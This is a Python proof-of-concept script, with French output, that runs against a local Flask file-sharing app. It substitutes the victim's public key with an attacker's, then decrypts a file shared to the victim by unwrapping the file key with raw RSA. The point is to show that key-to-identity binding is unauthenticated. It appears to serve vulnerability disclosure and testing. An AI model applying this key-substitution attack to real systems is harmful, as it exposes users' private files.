import io

from cryptography.hazmat.primitives.ciphers.aead import AESGCM

from app.app import app, USERS, SHARES

OWNER, VICTIM, ATTACKER = "poc_owner", "poc_victim", "poc_attacker"
PASSWORD = "local-poc-pass-123"
SECRET_FILE = b"Demonstration: contenu partage normalement avec la victime."

client = app.test_client()

def register(username):
    response = client.post("/register", json={"username": username, "password": PASSWORD})
    if response.status_code != 201:
        raise SystemExit(f"Création de {username!r} impossible ({response.status_code}); changez les noms.")

def token_for(username):
    response = client.post("/login", json={"username": username, "password": PASSWORD})
    if response.status_code != 200:
        raise SystemExit(f"Connexion de {username!r} impossible ({response.status_code}).")
    return {"Authorization": "Bearer " + response.get_json()["token"]}

for name in (OWNER, VICTIM, ATTACKER):
    register(name)
owner_headers = token_for(OWNER)

upload = client.post(
    "/upload", headers=owner_headers, content_type="multipart/form-data",
    data={"file": (io.BytesIO(SECRET_FILE), "document.txt")},
)
if upload.status_code != 201:
    raise SystemExit(f"Dépôt échoué: {upload.status_code} {upload.get_data(as_text=True)}")
file_id = upload.get_json()["file_id"]

original_victim_key = USERS[VICTIM]["public_key"]
attacker_public_key = USERS[ATTACKER]["public_key"]
USERS[VICTIM]["public_key"] = attacker_public_key

share = client.post(f"/share/{file_id}", headers=owner_headers, json={"to": VICTIM})
if share.status_code != 201:
    raise SystemExit(f"Partage échoué: {share.status_code} {share.get_data(as_text=True)}")
share_entry = SHARES[(file_id, VICTIM)]

attacker_private = USERS[ATTACKER]["private_key"]
wrapped = share_entry["wrapped_key"]
n = attacker_private.public_key().public_numbers().n
d = attacker_private.private_numbers().d
m = pow(int.from_bytes(wrapped, "big"), d, n)
file_key = m.to_bytes(32, "big")
recovered = AESGCM(file_key).decrypt(
    share_entry["blob"][:12], share_entry["blob"][12:], None
)
USERS[VICTIM]["public_key"] = original_victim_key
print(f"[+] Clé publique de {VICTIM!r} substituée par celle de {ATTACKER!r}.")
print(f"[+] Le partage adressé à {VICTIM!r} a été déchiffré par l’attaquant : {recovered!r}")
if recovered != SECRET_FILE:
    raise SystemExit("Le clair récupéré ne correspond pas au fichier déposé.")
print("[+] Démontrée : l’association identité–clé publique n’est pas authentifiée.")
